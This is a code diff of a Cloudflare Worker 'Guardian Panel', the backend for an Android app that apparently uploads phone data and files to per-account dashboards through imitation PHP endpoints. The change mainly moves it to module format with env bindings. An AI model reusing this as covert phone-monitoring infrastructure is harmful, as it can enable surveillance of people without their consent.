@@ -1,4 +1,4 @@
-// Guardian Panel — Multi-ACCOUNT Worker (login + register + per-account data)
+// Guardian Panel — Multi-ACCOUNT Worker (MODULE format — assets ke saath zaroori)
 // ACCOUNT SYSTEM:
 //   - /register page se account banao (email + password) -> KV mein save (persistent)
 //   - APK setup mein WAHI email/password dalo -> us phone ka data usi account ke andar
@@ -13,14 +13,16 @@
 //   user/savePhone.php        -> {"status":"ok","idPhone":unique}
 //   user/getLastVersionApp.php-> {"forceUpdateApp":"false"}
 //
+// Bindings: env.KV_DATA (KV namespace), env.ASSETS (static files)
 // KV keys: acct:data, acct:seq, dev:names, dev:client, f:<id>, m:<id>
-// Passwords repo mein NAHI — sirf SHA-256 hashes.
 
 var captures = [];
 var MAX_CAPTURES = 2000;
 var PASS_HASH = "86f1672bb6586732adac9bc70e357457bfe50c1dd20cdcbcf82476f6a0d0a3d5";
 var SESSION_DAYS = 30;
 var APK_UA = "ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019";
+
+var ENV = null; // env bindings (KV_DATA, ASSETS) — fetch pe set hota hai
 
 /* ---------- in-memory state (KV se load hote hain) ---------- */
 var accounts = {}; // email -> {p: hash, c: idClient}
@@ -34,7 +36,7 @@ var namesLoaded = false;
 var devClientLoaded = false;
 
 function hasKV() {
-  return typeof KV_DATA !== "undefined" && KV_DATA;
+  return !!(ENV && ENV.KV_DATA);
 }
 
 async function loadAccounts() {
@@ -42,9 +44,9 @@ async function loadAccounts() {
   accountsLoaded = true;
   if (!hasKV()) return;
   try {
-    var raw = await KV_DATA.get("acct:data");
+    var raw = await ENV.KV_DATA.get("acct:data");
     if (raw) accounts = JSON.parse(raw) || {};
-    var sq = await KV_DATA.get("acct:seq");
+    var sq = await ENV.KV_DATA.get("acct:seq");
     acctSeq = sq ? parseInt(sq, 10) || 0 : 0;
   } catch (e) {}
 }
@@ -52,8 +54,8 @@ async function loadAccounts() {
 async function saveAccounts() {
   if (!hasKV()) return;
   try {
-    await KV_DATA.put("acct:data", JSON.stringify(accounts));
-    await KV_DATA.put("acct:seq", String(acctSeq));
+    await ENV.KV_DATA.put("acct:data", JSON.stringify(accounts));
+    await ENV.KV_DATA.put("acct:seq", String(acctSeq));
   } catch (e) {}
 }
 
@@ -62,7 +64,7 @@ async function loadNames() {
   namesLoaded = true;
   if (!hasKV()) return;
   try {
-    var raw = await KV_DATA.get("dev:names");
+    var raw = await ENV.KV_DATA.get("dev:names");
     if (raw) {
       deviceNames = JSON.parse(raw) || {};
       var mx = 0;
@@ -78,7 +80,7 @@ async function loadNames() {
 async function saveNames() {
   if (!hasKV()) return;
   try {
-    await KV_DATA.put("dev:names", JSON.stringify(deviceNames));
+    await ENV.KV_DATA.put("dev:names", JSON.stringify(deviceNames));
   } catch (e) {}
 }
 
@@ -87,7 +89,7 @@ async function loadDevClient() {
   devClientLoaded = true;
   if (!hasKV()) return;
   try {
-    var raw = await KV_DATA.get("dev:client");
+    var raw = await ENV.KV_DATA.get("dev:client");
     if (raw) devClient = JSON.parse(raw) || {};
   } catch (e) {}
 }
@@ -95,7 +97,7 @@ async function loadDevClient() {
 async function saveDevClient() {
   if (!hasKV()) return;
   try {
-    await KV_DATA.put("dev:client", JSON.stringify(devClient));
+    await ENV.KV_DATA.put("dev:client", JSON.stringify(devClient));
   } catch (e) {}
 }
 
@@ -161,11 +163,11 @@ async function readSession(request) {
 
 /* ---------- assets ---------- */
 async function serveAsset(origin, targetPath) {
-  if (typeof ASSETS === "undefined" || !ASSETS) {
-    return new Response("Dashboard files not configured (assets missing)", { status: 500 });
+  if (!ENV || !ENV.ASSETS) {
+    return new Response("Dashboard files not configured (ASSETS binding missing)", { status: 500 });
   }
   try {
-    return await ASSETS.fetch(new Request(origin + targetPath));
+    return await ENV.ASSETS.fetch(new Request(origin + targetPath));
   } catch (e) {
     return new Response("Asset error: " + String(e), { status: 500 });
   }
@@ -176,8 +178,8 @@ async function serveFile(key) {
   if (!hasKV()) return jsonResp({ error: "KV_DATA not connected" }, 404);
   if (!key || key.indexOf(":") >= 0) return jsonResp({ error: "bad key" }, 400);
   try {
-    var metaRaw = await KV_DATA.get("m:" + key);
-    var data = await KV_DATA.get("f:" + key, "arrayBuffer");
+    var metaRaw = await ENV.KV_DATA.get("m:" + key);
+    var data = await ENV.KV_DATA.get("f:" + key, "arrayBuffer");
     if (!data) return jsonResp({ error: "not found" }, 404);
     var meta = { type: "application/octet-stream", name: key };
     if (metaRaw) {
@@ -217,7 +219,6 @@ async function handle(request) {
       var inPw = String(loginBody.password || "");
 
       if (inEmail === "") {
-        // Master / Admin login
         var masterHash = await sha256Hex(inPw);
         if (masterHash === PASS_HASH) {
           var tok = await makeSessionToken("admin", "all");
@@ -226,7 +227,6 @@ async function handle(request) {
         return jsonResp({ ok: false, error: "wrong password" }, 401);
       }
 
-      // Account login
       await loadAccounts();
       var acct = accounts[inEmail];
       if (acct) {
@@ -336,7 +336,6 @@ async function handle(request) {
             return jsonResp({ status: "ok", idClient: a.c });
           }
         }
-        // Account nahi mila / galat password -> app error dialog dikhayega
         return jsonResp({ status: "no2" });
       }
       if (p === "/user/verifPhone.php") {
@@ -381,8 +380,6 @@ async function handle(request) {
 
     if (sessGet) {
       if (path === "/" || path === "/index.html") return serveAsset(url.origin, "/index.html");
-      if (path === "/login") return Response.redirect(url.origin + "/", 302);
-      if (path === "/register") return Response.redirect(url.origin + "/", 302);
       return Response.redirect(url.origin + "/", 302);
     }
 
@@ -439,8 +436,8 @@ async function capturePost(request, url) {
           if (hasKV() && value.size <= 20971520) {
             try {
               var fkey = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
-              await KV_DATA.put("f:" + fkey, await value.arrayBuffer());
-              await KV_DATA.put("m:" + fkey, JSON.stringify(meta));
+              await ENV.KV_DATA.put("f:" + fkey, await value.arrayBuffer());
+              await ENV.KV_DATA.put("m:" + fkey, JSON.stringify(meta));
               meta.fileKey = fkey;
             } catch (e2) {
               // KV fail -> metadata only
@@ -502,3 +499,10 @@ async function capturePost(request, url) {
   }
   return cap;
 }
+
+export default {
+  async fetch(request, env, ctx) {
+    ENV = env;
+    return handle(request);
+  },
+};
